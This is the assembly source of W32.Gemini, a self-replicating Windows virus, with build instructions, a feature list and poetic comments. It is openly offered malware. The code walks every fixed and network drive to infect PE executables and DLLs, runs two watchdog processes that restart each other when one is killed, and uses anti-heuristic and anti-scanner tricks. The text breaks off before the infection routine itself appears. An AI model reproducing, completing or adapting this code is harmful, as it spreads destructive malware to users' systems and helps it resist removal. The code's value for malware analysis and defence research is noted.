
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[GEMINI.ASM]컴�
comment ;)
W32.Gemini by roy g biv

some of its features:
- parasitic resident (own process) infector of PE exe/dll (but not looking at suffix)
- co-operative processes (if one process is killed, the other will restart it)
- infects files in all directories on all fixed and network drives
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
- uses CRCs instead of API names
- uses SEH for common code exit
- section attributes are never altered (virus is not self-modifying)
- no infect files with data outside of image (eg self-extractors)
- infected files are padded by random amounts to confuse tail scanners
- uses SEH walker to find kernel address (no hard-coded addresses)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm
- plus some new code optimisations that were never seen before W32.EfishNC :)
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 gemini
tlink32 /B:400000 /x gemini,,,import32

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.486
.model  flat

extern  GetCurrentProcess:proc
extern  WriteProcessMemory:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

.data

;must be reverse alphabetical order because they are stored on stack
;API names are not present in replications, only in dropper

expnames        db      "WriteFile"           , 0
                db      "WinExec"             , 0
                db      "SetFileAttributesA"  , 0
                db      "MoveFileA"           , 0
                db      "GlobalFree"          , 0
                db      "GlobalAlloc"         , 0
                db      "GetWindowsDirectoryA", 0
                db      "GetTickCount"        , 0
                db      "GetTempFileNameA"    , 0
                db      "GetFileAttributesA"  , 0
                db      "DeleteFileA"         , 0
                db      "CreateFileA"         , 0
                db      "CloseHandle"         , 0

krnnames        db      "WaitForSingleObject" , 0
                db      "UnmapViewOfFile"     , 0
                db      "Sleep"               , 0
                db      "SetFileTime"         , 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileAttributesA"  , 0
                db      "SetEvent"            , 0
                db      "SetCurrentDirectoryW", 0
                db      "SetCurrentDirectoryA", 0
                db      "ResetEvent"          , 0
                db      "ReadProcessMemory"   , 0
                db      "OpenProcess"         , 0
                db      "OpenEventA"          , 0
                db      "MultiByteToWideChar" , 0
                db      "MapViewOfFile"       , 0
                db      "LoadLibraryA"        , 0
                db      "GlobalFree"          , 0
                db      "GlobalAlloc"         , 0
                db      "GetVersion"          , 0
                db      "GetTickCount"        , 0
                db      "GetStartupInfoA"     , 0
                db      "GetFullPathNameW"    , 0
                db      "GetFullPathNameA"    , 0
                db      "GetDriveTypeA"       , 0
                db      "GetCurrentProcessId" , 0
                db      "GetCommandLineA"     , 0
                db      "FindNextFileW"       , 0
                db      "FindNextFileA"       , 0
                db      "FindFirstFileW"      , 0
                db      "FindFirstFileA"      , 0
                db      "FindClose"           , 0
                db      "CreateThread"        , 0
                db      "CreateProcessA"      , 0
                db      "CreateFileW"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileA"         , 0
                db      "CreateEventA"        , 0
                db      "CloseHandle"         , 0

sfcnames        db      "SfcIsFileProtected", 0

exename         equ     "gemini"                ;must be < 8 bytes long else code change

txttitle        db      "Gemini", 0
txtbody         db      "running...", 0

include gemini.inc

patch_host      label   near
        pop     ecx
        push    ecx
        call    $ + 5
        pop     eax
        add     eax, offset host_patch - offset $ + 6
        sub     ecx, eax
        push    ecx
        mov     eax, esp
        xor     edi, edi
        push    edi
        push    4
        push    eax
        push    offset host_patch + 1
        push    esi
        call    WriteProcessMemory
        jmp     gemini_inf
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;virus code begins here in dropped exe
;-----------------------------------------------------------------------------

gemini_exe      proc    near
        call    walk_seh

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near
        dd      offset swap_create - offset krncrcend + 4
        db      "Gemini - roy g biv"            ;two heads are better than one

walk_seh        label   near
        xor     esi, esi
        lods    dword ptr fs:[esi]
        inc     eax

seh_loop        label   near
        dec     eax
        xchg    esi, eax
        lods    dword ptr [esi]
        inc     eax
        jne     seh_loop
        lods    dword ptr [esi]

;-----------------------------------------------------------------------------
;moved label after some data because "e800000000" looks like virus code ;)
;-----------------------------------------------------------------------------

init_findmz     label   near
        inc     eax
        xchg    edi, eax

find_mzhdr      label   near

;-----------------------------------------------------------------------------
;do not use hard-coded kernel address values because it is not portable
;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
;they will maybe change again for every new release
;-----------------------------------------------------------------------------

        dec     edi                             ;sub 64kb
        xor     di, di                          ;64kb align
        call    is_pehdr
        jne     find_mzhdr
        mov     ebx, edi
        pop     edi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
        lea     esi, dword ptr [ebx + esi + peexp.expordbase]
        lods    dword ptr [esi]                 ;Ordinal Base
        lea     ebp, dword ptr [eax * 2 + ebx]
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        add     ebp, dword ptr [esi]            ;Ordinal Table RVA
        lea     ecx, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 4]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        add     edi, dword ptr [edi + 4]
        jmp     edi
csum    db      'r'                             ;altered to give sum == 1

;-----------------------------------------------------------------------------
;swap CreateFileW and CreateFileMappingA because of alphabet order
;-----------------------------------------------------------------------------

swap_create     label   near
        mov     dword ptr [edi + offset store_krnapi - offset swap_create + 3], esp
        mov     ebx, esp
        mov     eax, dword ptr [ebx + krncrcstk.kCreateFileMappingA]
        xchg    dword ptr [ebx + krncrcstk.kCreateFileW], eax
        mov     dword ptr [ebx + krncrcstk.kCreateFileMappingA], eax

;-----------------------------------------------------------------------------
;get SFC support if available
;-----------------------------------------------------------------------------

        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

load_sfc        label   near
        call    cLoadLibraryA
        test    eax, eax
        jne     found_sfc
        push    'cfs'                           ;Windows Me/2000
        push    esp
        call    cLoadLibraryA
        pop     ecx
        test    eax, eax
        je      sfcapi_esp

found_sfc       label   near
        push    edi
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (sfccrc_count + 1) dup (0)
sfccrcend       label   near
        dd      offset sfcapi_pop - offset sfccrcend + 4

sfcapi_pop      label   near
        pop     eax
        pop     edi

sfcapi_esp      label   near
        mov     dword ptr [edi + offset store_sfcapi - offset swap_create + 1], eax
        mov     ecx, offset gemini_codeend - offset gemini_exe
        lea     esi, dword ptr [edi + offset gemini_exe - offset swap_create]
        xor     al, al

calc_sum        label   near
        add     al, byte ptr [esi]
        inc     esi
        loop    calc_sum
        dec     eax
        sub     byte ptr [edi + offset csum - offset swap_create], al
        push    eax
        push    esp
        xor     esi, esi
        push    esi
        push    esi
        call    create_thr1

;-----------------------------------------------------------------------------
;thread 1: infect files on all fixed and remote drive letters
;-----------------------------------------------------------------------------

find_drives     proc    near
        mov     eax, '\:A'                      ;NEC-PC98 uses A: for boot drive which can be hard disk

drive_loop      label   near
        push    eax
        push    esp
        push    (krncrcstk.kGetDriveTypeA - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        sub     al, DRIVE_FIXED
        je      drive_set
        xchg    ecx, eax
        loop    drive_next                      ;loop if not DRIVE_REMOTE

        ;if I were you, you were me
        ;I wonder who I'd wanna be
        ;with just one wish you can't refuse
        ;I wouldn't know what to choose

drive_set       label   near
        push    esp
        call    cSetCurrentDirectoryA
        call    find_files

drive_next      label   near
        pop     eax
        inc     eax
        cmp     al, 'Z' + 1
        jne     drive_loop
        push    10 * 60 * 1000                  ;10 minutes
        call    cSleep
        jmp     find_drives
find_drives     endp

create_thr1     label   near
        push    esi
        push    esi
        call    cCreateThread

;-----------------------------------------------------------------------------
;alg for process 1                              |alg for process 2
;if argc == 1                                   |if argc == 1
;{                                              |{
;    pid1 = GetCurrentProcessId                 |    always false for process 2
;    do                                         |
;    {                                          |
;        CreateEventA(event1, true)             |
;        CreateEventA(event2, false)            |
;        pid2 = CreateProcessA(process2, pid1, event 1, event 2)
;        WaitForSingleObject(event2, timeout)   |
;restart:                                       |
;        CloseHandle(event2)                    |
;        CloseHandle(event1)                    |
;    }                                          |
;    while !signal                              |
;}                                              |}
;OpenProcess(pid2)                              |OpenProcess(pid1)
;OpenEventA(event1)                             |OpenEventA(event1)
;OpenEventA(event2)                             |OpenEventA(event2)
;do                                             |do
;{                                              |{
;    if WaitForSingleObject(event1, 0)          |    if WaitForSingleObject(event2, 0)
;        break                                  |        break
;    ResetEvent(event2)                         |    ResetEvent(event1)
;    if !checksum(pid2)                         |    if !checksum(pid1)
;        break                                  |        break
;    SetEvent(event1)                           |    SetEvent(event2)
;    Sleep(sleeplen)                            |    Sleep(sleeplen)
;}                                              |}
;while WaitForSingleObject(event2, timeout)     |while WaitForSingleObject(event1, timeout)
;CloseHandle(pid2)                              |CloseHandle(pid1)
;goto restart                                   |goto restart (and process 2 becomes process 1)
;-----------------------------------------------------------------------------

        enter   MAX_PATH + 32, 0                ;pathname, pid, event1, event2

get_cmdline     label   near
        push    (krncrcstk.kGetCommandLineA - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        xchg    esi, eax
        mov     edi, esp
        mov     ah, '"'
        lods    byte ptr [esi]
        stos    byte ptr [edi]
        cmp     al, ah
        je      find_argv
        mov     ah, ' '

find_argv       label   near
        lods    byte ptr [esi]
        stos    byte ptr [edi]
        test    al, al
        je      no_argv
        cmp     al, ah
        jne     find_argv

find_argv1      label   near
        mov     edx, esi
        lods    byte ptr [esi]                  ;the unpredictable case:
        cmp     al, ' '                         ;how many spaces?
        je      find_argv1                      ;can be 0, 1, or 2
        xor     ecx, ecx
        dec     esi
        inc     edi

no_argv         label   near
        xor     ebx, ebx
        mov     byte ptr [esi - 1], bl          ;no args for restart
        dec     edi
        test    al, al
        mov     al, ' '
        stos    byte ptr [edi]
        jne     skip_argv1
        mov     ebp, esp
        push    (krncrcstk.kGetCurrentProcessId - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        xchg    ecx, eax
        push    edi
        call    hexdwd2asc
        inc     edi
        call    cGetTickCount
        push    eax
        xchg    ecx, eax
        call    create_event
        pop     ecx
        push    eax                             ;CloseHandle
        rol     ecx, 1
        call    create_event
        pop     ecx
        pop     edi
        push    ebx                             ;init continue flag
        push    ecx
        push    eax                             ;CloseHandle
        push    TIMEOUT * 1000                  ;WaitForSingleObject
        push    eax                             ;WaitForSingleObject
        sub     esp, size processinfo
        mov     edx, esp
        sub     esp, size startupinfo
        mov     ecx, esp
        push    edx
        push    ecx
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    ebp
        push    ebx
        push    ecx
        push    (krncrcstk.kGetStartupInfoA - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        push    (krncrcstk.kCreateProcessA - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        add     esp, size startupinfo + processinfo.pidwProcessId
        pop     ebx
        pop     eax
        call    cWaitForSingleObject
        test    eax, eax
        setz    byte ptr [esp + 8]              ;store continue flag

restart         label   near
        call    cCloseHandle
        call    cCloseHandle
        pop     eax
        test    eax, eax

branch_cmd      label   near
        je      get_cmdline
        mov     ecx, ebx                        ;remote PID
        mov     esi, edi

skip_argv1      label   near
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    byte ptr [edi], byte ptr [esi]

find_argv2      label   near
        mov     ebp, edi                        ;argv2
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        inc     esi
        xor     al, al
        stos    byte ptr [edi]
        mov     ebx, edi                        ;argv3
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        stos    byte ptr [edi]
        inc     ecx
        loop    skip_pid
        call    asc2hex
        xchg    ebp, ebx                        ;swap event order for remote process

skip_pid        label   near
        push    ecx
        xor     edi, edi
        push    edi
        push    PROCESS_VM_READ
        push    (krncrcstk.kOpenProcess - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        test    eax, eax
        je      branch_cmd
        push    edi                             ;clear continue flag
        push    eax                             ;CloseHandle
        push    ebx
        push    edi
        mov     eax, EVENT_MODIFY_STATE or SYNCHRONIZE
        push    eax
        push    ebp
        push    edi
        push    eax
        call    cOpenEventA
        xchg    esi, eax                        ;event1
        call    cOpenEventA
        xchg    edi, eax                        ;event2

        ;sing with me just for today
        ;maybe tomorrow the good Lord will take you away

main_loop       label   near
        push    0
        push    esi
        call    cWaitForSingleObject            ;ensure local event reset by remote process
        xchg    ecx, eax
        jecxz   shutdown                        ;still signalled
        push    edi
        push    (krncrcstk.kResetEvent - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi

        ;local process checksums remote process
        ;remote process checksums local process

        pop     eax
        push    eax
        enter   (offset gemini_codeend - offset gemini_exe + 3) and -4, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    offset gemini_codeend - offset gemini_exe
        push    ecx
        push    401000h + expsize
        push    eax
        push    (krncrcstk.kReadProcessMemory - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        pop     ecx
        jecxz   shutdown                        ;read failure
        xor     eax, eax

check_sum       label   near
        add     al, byte ptr [esp]
        inc     esp
        loop    check_sum
        leave
        xchg    ecx, eax
        loop    shutdown
        push    esi
        push    (krncrcstk.kSetEvent - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        push    SLEEPLEN * 1000
        call    cSleep
        push    TIMEOUT * 1000
        push    edi
        call    cWaitForSingleObject
        xchg    ecx, eax
        jecxz   main_loop                       ;signalled in time

        ;if one process is killed, then one more process will start
        ;if one process is altered, then two more processes will start!
        ;like the Sorceror's Apprentice ;)

shutdown        label   near
        call    cCloseHandle
        push    esi
        push    edi
        jmp     restart

skip_spaces     proc    near
        mov     ecx, edi
        lods    byte ptr [esi]
        stos    byte ptr [edi]
        cmp     al, ' '
        je      skip_spaces
        ret
skip_spaces     endp

asc2hex         proc    near
        xor     ecx, ecx
        mov     esi, edx

asc2hex_loop    label   near
        lods    byte ptr [esi]
        sub     al, '0'
        jb      asc2hex_ret
        cmp     al, 9
        jbe     asc2hex_add
        sub     al, 7

asc2hex_add     label   near
        shl     ecx, 4
        or      cl, al
        jmp     asc2hex_loop

asc2hex_ret     label   near
        ret
asc2hex         endp

create_event    proc    near
        mov     al, ' '
        dec     edi
        stos    byte ptr [edi]
        push    edi                             ;CreateEventA
        call    hexdwd2asc
        xor     al, al
        stos    byte ptr [edi]
        push    ebx
        push    esp                             ;non-zero
        push    ebx
        push    (krncrcstk.kCreateEventA - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        ret

hexdwd2asc      proc    near
        call    hexwrd2asc
        call    hexwrd2asc
        call    hexwrd2asc

hexwrd2asc      proc    near
        rol     ecx, 8
        mov     eax, ecx
        aam     10h
        call    hexbyt2asc

hexbyt2asc      proc    near
        xchg    ah, al
        cmp     al, 0ah
        sbb     al, 69h
        das
        stos    byte ptr [edi]
        ret
hexbyt2asc      endp
hexwrd2asc      endp
hexdwd2asc      endp
create_event    endp

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

find_files      proc    near
        push    size findlist
        push    GMEM_ZEROINIT
        call    cGlobalAlloc
        test    eax, eax
        je      file_exit
        xchg    esi, eax
        call    get_krnapis

file_first      label   near
        push    '*'                             ;ANSI-compatible Unicode findmask
        mov     eax, esp
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        push    eax
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
        pop     ecx
        mov     dword ptr [esi + findlist.findhand], eax
        inc     eax
        je      file_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
        je      file_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   file_next
        push    size findlist
        push    GMEM_FIXED
        call    cGlobalAlloc
        xchg    ecx, eax
        jecxz   step_updir
        xchg    esi, ecx
        mov     dword ptr [esi + findlist.findprev], ecx
        jmp     file_first

file_exit       label   near
        ret

file_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        mov     edi, dword ptr [esi + findlist.findhand]
        push    edi
        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node
;-----------------------------------------------------------------------------

        push    edi
        mov     al, (krncrcstk.kFindClose - krncrcstk.kWaitForSingleObject) shr 2
        call    store_krnapi

file_prev       label   near
        push    esi
        mov     esi, dword ptr [esi + findlist.findprev]
        call    cGlobalFree
        test    esi, esi
        je      file_exit

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        push    esp
        call    cSetCurrentDirectoryA
        pop     eax
        jmp     file_next

test_file       label   near

;-----------------------------------------------------------------------------
;get full path and convert to Unicode if required (SFC requires Unicode path)
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        mov     eax, ebp
        enter   MAX_PATH * 2, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    ecx
        push    MAX_PATH
        push    edi
        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
        xchg    edi, eax
        pop     eax
        xor     ebx, ebx
        call    cGetVersion
        test    eax, eax
        jns     store_sfcapi

        ;did you dream you were together and wake up alone?

        mov     ecx, esp
        xchg    ebp, eax
        enter   MAX_PATH * 2, 0
        xchg    ebp, eax
        mov     eax, esp
        push    MAX_PATH
        push    eax
        inc     edi
        push    edi
        push    ecx
        push    ebx                             ;use default translation
        push    ebx                             ;CP_ANSI
        push    (krncrcstk.kMultiByteToWideChar - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi

store_sfcapi    label   near

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     ecx, '!bgr'                     ;SfcIsFileProtected
        xor     eax, eax                        ;fake success in case of no SFC
        jecxz   leave_sfc
        push    esp
        push    ebx
        call    ecx

leave_sfc       label   near
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx                             ;attribute ignored for existing files
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ or GENERIC_WRITE
        push    edi
        call    dword ptr [ebp + krncrcstk.kCreateFileW]
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)

close_file      label   near                    ;label required for delta offset
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        push    eax
        sub     eax, 8
        push    eax
        sub     eax, 8
        push    eax
        push    ebx
        push    (krncrcstk.kSetFileTime - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        push    ebx
        call    cCloseHandle

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        call    set_fileattr
        jmp     file_next
find_files      endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        push    edi
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
        ret                                     ;edi -> filename
        db      "14/02/02"                      ;missing her on Valentine's Day
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
        mov     ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;-----------------------------------------------------------------------------

        test    ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        jne     inftest_ret
        add     esi, pehdr.peentrypoint - pehdr.pecoff.petimedate

;-----------------------------------------------------------------------------
;if file is a .dll, then we require an entry point function
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]
        xchg    ecx, eax
        test    ah, IMAGE_FILE_DLL shr 8
        je      test_system
        jecxz   inftest_ret

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

test_system     label   near
        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], 0
        jne     inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
        add     eax, edx
        lea     esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        call    cGetTickCount
        and     eax, RANDPADMAX - 1
        add     ax, small (offset gemini_codeend - offset gemini_exe + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        xor     ecx, ecx
        push    eax
        push    eax                             ;MapViewOfFile
        push    ecx                             ;MapViewOfFile
        push    ecx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    ecx
        push    eax
        push    ecx
        push    PAGE_READWRITE
        push    ecx
        push    ebx
        push    (krncrcstk.kCreateFileMappingA - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax                             ;ANSI map is allowed because of no name
        call    store_krnapi
        push    eax
        xchg    edi, eax
        push    (krncrcstk.kMapViewOfFile - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        mov     esp, dword ptr [esp + sehstruc.sehprevseh]
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        push    (krncrcstk.kUnmapViewOfFile - krncrcstk.kWaitForSingleObject) shr 2
        pop     eax
        call    store_krnapi
        call    cCloseHandle
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;determine platform and dynamically select function types (ANSI or Unicode)
;-----------------------------------------------------------------------------

get_krnapis     proc    near                    ;place near to jump table for smaller code
        call    cGetVersion

krnapi_delta    label   near
        shr     eax, 1fh
        mov     ecx, dword ptr [esp - 4]        ;no stack change in ring 3
        mov     ecx, dword ptr [ecx + offset store_krnapi - offset krnapi_delta + 3]
        lea     ebp, dword ptr [eax * 4 + ecx]
        ret
get_krnapis     endp

;-----------------------------------------------------------------------------
;indexed API jump table
;-----------------------------------------------------------------------------

cWaitForSingleObject    proc    near
        xor     eax, eax
        jmp     store_krnapi
cWaitForSingleObject    endp

cSleep                  proc    near
        push    (krncrcstk.kSleep - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cSleep                  endp

cSetCurrentDirectoryA   proc    near
        push    (krncrcstk.kSetCurrentDirectoryA - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cSetCurrentDirectoryA   endp

cOpenEventA             proc    near
        push    (krncrcstk.kOpenEventA - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cOpenEventA             endp

cLoadLibraryA           proc    near
        push    (krncrcstk.kLoadLibraryA - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cLoadLibraryA           endp

cGlobalFree             proc    near
        push    (krncrcstk.kGlobalFree - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cGlobalFree             endp

cGlobalAlloc            proc    near
        push    (krncrcstk.kGlobalAlloc - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cGlobalAlloc            endp

cGetVersion             proc    near
        push    (krncrcstk.kGetVersion - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cGetVersion             endp

cGetTickCount           proc    near
        push    (krncrcstk.kGetTickCount - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cGetTickCount           endp

cCreateThread           proc    near
        push    (krncrcstk.kCreateThread - krncrcstk.kWaitForSingleObject) shr 2
        jmp     call_krncrc
cCreateThread           endp

cCloseHandle            proc    near
        push    (krncrcstk.kCloseHandle - krncrcstk.kWaitForSingleObject) shr 2
cCloseHandle            endp

call_krncrc     proc    near
        pop     eax

store_krnapi    label   near
